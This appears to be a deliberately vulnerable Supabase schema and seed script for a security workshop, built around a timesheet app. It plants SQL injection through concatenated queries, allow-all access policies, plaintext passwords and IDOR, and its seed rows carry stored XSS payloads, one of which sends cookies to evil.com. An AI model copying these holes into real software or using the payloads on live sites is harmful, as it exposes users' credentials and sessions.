-- ============================================
-- TIMESHEET WORKSHOP — Supabase Schema
-- ⚠️ INTENCIONALMENTE VULNERÁVEL ⚠️
-- ============================================

-- 1. PROFILES TABLE
CREATE TABLE IF NOT EXISTS profiles (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  email TEXT UNIQUE NOT NULL,
  full_name TEXT NOT NULL,
  role TEXT DEFAULT 'user',        -- VULN: mass assignment allows changing to 'admin'
  department TEXT DEFAULT 'TI',
  avatar_url TEXT,
  password_plain TEXT,              -- VULN: storing plaintext password
  created_at TIMESTAMPTZ DEFAULT now()
);

-- 2. TIME ENTRIES TABLE
CREATE TABLE IF NOT EXISTS time_entries (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  user_id UUID REFERENCES profiles(id) ON DELETE CASCADE,
  entry_date DATE NOT NULL DEFAULT CURRENT_DATE,
  check_in TIME,
  lunch_out TIME,
  lunch_in TIME,
  check_out TIME,
  total_hours NUMERIC(5,2) DEFAULT 0,
  status TEXT DEFAULT 'pending',   -- pending, approved, tracking, scheduled
  note TEXT,                        -- VULN: stored XSS via this field
  created_at TIMESTAMPTZ DEFAULT now()
);

-- 3. REQUESTS TABLE
CREATE TABLE IF NOT EXISTS requests (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  user_id UUID REFERENCES profiles(id) ON DELETE CASCADE,
  request_type TEXT NOT NULL,       -- 'overtime', 'adjustment', 'correction', 'retroactive'
  request_date DATE NOT NULL DEFAULT CURRENT_DATE,
  start_time TIME,
  end_time TIME,
  justification TEXT,               -- VULN: stored XSS via dangerouslySetInnerHTML
  status TEXT DEFAULT 'pending',    -- pending, approved, rejected
  reviewer_note TEXT,
  created_at TIMESTAMPTZ DEFAULT now()
);

-- 4. ANALYTICS LOGS TABLE
CREATE TABLE IF NOT EXISTS analytics_logs (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  user_id UUID REFERENCES profiles(id) ON DELETE CASCADE,
  log_date DATE NOT NULL,
  document TEXT,
  contract TEXT,
  service TEXT,
  activity TEXT,
  description TEXT,
  start_time TIME,
  end_time TIME,
  hours NUMERIC(5,2) DEFAULT 0,
  created_at TIMESTAMPTZ DEFAULT now()
);

-- ============================================
-- RLS: DESABILITADO (VULN: Broken Access Control)
-- ============================================
ALTER TABLE profiles ENABLE ROW LEVEL SECURITY;
ALTER TABLE time_entries ENABLE ROW LEVEL SECURITY;
ALTER TABLE requests ENABLE ROW LEVEL SECURITY;
ALTER TABLE analytics_logs ENABLE ROW LEVEL SECURITY;

-- Políticas permissivas — qualquer um com anon key pode tudo
CREATE POLICY "Allow all on profiles" ON profiles FOR ALL USING (true) WITH CHECK (true);
CREATE POLICY "Allow all on time_entries" ON time_entries FOR ALL USING (true) WITH CHECK (true);
CREATE POLICY "Allow all on requests" ON requests FOR ALL USING (true) WITH CHECK (true);
CREATE POLICY "Allow all on analytics_logs" ON analytics_logs FOR ALL USING (true) WITH CHECK (true);

-- ============================================
-- VULNERABLE RPC FUNCTION — SQL Injection
-- ============================================
CREATE OR REPLACE FUNCTION search_entries(search_term TEXT)
RETURNS SETOF analytics_logs
LANGUAGE plpgsql
SECURITY DEFINER
AS $$
BEGIN
  -- VULN: string concatenation instead of parameterized query
  RETURN QUERY EXECUTE
    'SELECT * FROM analytics_logs WHERE 
     contract ILIKE ''%' || search_term || '%'' 
     OR service ILIKE ''%' || search_term || '%''
     OR activity ILIKE ''%' || search_term || '%''
     OR description ILIKE ''%' || search_term || '%''';
END;
$$;

-- Function to get ANY user profile (IDOR)
CREATE OR REPLACE FUNCTION get_user_profile(user_id_param TEXT)
RETURNS SETOF profiles
LANGUAGE plpgsql
SECURITY DEFINER
AS $$
BEGIN
  -- VULN: no authorization check, returns all fields including password_plain
  RETURN QUERY EXECUTE
    'SELECT * FROM profiles WHERE id::text = ''' || user_id_param || '''';
END;
$$;

-- ============================================
-- SEED DATA
-- ============================================

-- Users (passwords stored in plain text — VULN)
INSERT INTO profiles (id, email, full_name, role, department, password_plain) VALUES
  ('a1b2c3d4-e5f6-7890-abcd-ef1234567890', 'kenzo@kronos.io', 'Kenzo Fujimoto', 'admin', 'TI', 'admin123'),
  ('b2c3d4e5-f6a7-8901-bcde-f12345678901', 'maria@kronos.io', 'Maria Silva', 'user', 'RH', 'senha123'),
  ('c3d4e5f6-a7b8-9012-cdef-123456789012', 'joao@kronos.io', 'João Santos', 'user', 'Financeiro', 'joao2026'),
  ('d4e5f6a7-b8c9-0123-defa-234567890123', 'admin@kronos.io', 'Administrador', 'admin', 'Diretoria', 'P@ssw0rd!')
ON CONFLICT (id) DO NOTHING;

-- Time entries for Kenzo
INSERT INTO time_entries (user_id, entry_date, check_in, lunch_out, lunch_in, check_out, total_hours, status) VALUES
  ('a1b2c3d4-e5f6-7890-abcd-ef1234567890', '2026-03-31', '08:30', '12:30', '13:30', '17:30', 8.00, 'approved'),
  ('a1b2c3d4-e5f6-7890-abcd-ef1234567890', '2026-04-01', '08:15', '12:15', '13:15', '17:15', 8.00, 'approved'),
  ('a1b2c3d4-e5f6-7890-abcd-ef1234567890', '2026-04-02', '09:00', '13:00', '14:00', '19:30', 9.50, 'pending'),
  ('a1b2c3d4-e5f6-7890-abcd-ef1234567890', CURRENT_DATE, '08:30', '12:30', '13:30', NULL, 0, 'tracking');

-- Time entries for Maria
INSERT INTO time_entries (user_id, entry_date, check_in, lunch_out, lunch_in, check_out, total_hours, status, note) VALUES
  ('b2c3d4e5-f6a7-8901-bcde-f12345678901', '2026-04-01', '09:00', '12:00', '13:00', '18:00', 8.00, 'approved', 'Dia normal'),
  ('b2c3d4e5-f6a7-8901-bcde-f12345678901', '2026-04-02', '08:00', '12:00', '13:00', '17:00', 8.00, 'approved', '<img src=x onerror="alert(''XSS via note!'')">');

-- Requests
INSERT INTO requests (user_id, request_type, request_date, start_time, end_time, justification, status) VALUES
  ('a1b2c3d4-e5f6-7890-abcd-ef1234567890', 'overtime', '2026-04-01', '17:30', '20:00', 'Deploy de sistema em produção fora do horário comercial', 'pending'),
  ('a1b2c3d4-e5f6-7890-abcd-ef1234567890', 'adjustment', '2026-03-28', '08:00', '08:30', 'Erro no sistema impediu registro de entrada', 'approved'),
  ('b2c3d4e5-f6a7-8901-bcde-f12345678901', 'overtime', '2026-03-25', '18:00', '22:00', '<script>document.location="https://evil.com/steal?cookie="+document.cookie</script>', 'pending');

-- Analytics logs
INSERT INTO analytics_logs (user_id, log_date, document, contract, service, activity, description, start_time, end_time, hours) VALUES
  ('a1b2c3d4-e5f6-7890-abcd-ef1234567890', '2026-04-01', 'DOC-2026-001', 'CTR-Alpha-Omega', 'Consultoria TI', 'Reunião de Alinhamento', 'Definição de escopo inicial do projeto.', '09:00', '12:00', 3.00),
  ('a1b2c3d4-e5f6-7890-abcd-ef1234567890', '2026-04-01', 'DOC-2026-002', 'CTR-Alpha-Omega', 'Desenvolvimento', 'Implementação Frontend', 'Criação dos componentes base em React.', '13:00', '18:00', 5.00),
  ('a1b2c3d4-e5f6-7890-abcd-ef1234567890', '2026-04-02', 'DOC-2026-003', 'CTR-Beta-Gamma', 'Auditoria', 'Análise de Riscos', 'Revisão de conformidade de segurança.', '08:00', '12:00', 4.00),
  ('a1b2c3d4-e5f6-7890-abcd-ef1234567890', '2026-04-02', 'DOC-2026-004', 'CTR-Beta-Gamma', 'Documentação', 'Relatório Final', 'Compilação dos dados para entrega.', '13:30', '17:30', 4.00),
  ('a1b2c3d4-e5f6-7890-abcd-ef1234567890', '2026-04-03', 'DOC-2026-005', 'CTR-Delta-Force', 'Suporte', 'Atendimento N1', 'Resolução de tickets de usuários.', '09:00', '18:00', 8.00),
  ('b2c3d4e5-f6a7-8901-bcde-f12345678901', '2026-04-01', 'DOC-2026-010', 'CTR-Sigma-HR', 'Recursos Humanos', 'Recrutamento', 'Processo seletivo para dev senior.', '09:00', '17:00', 7.00),
  ('c3d4e5f6-a7b8-9012-cdef-123456789012', '2026-04-01', 'DOC-2026-020', 'CTR-Finance-Q1', 'Contabilidade', 'Fechamento Mensal', 'Conciliação bancária março.', '08:00', '18:00', 9.00);
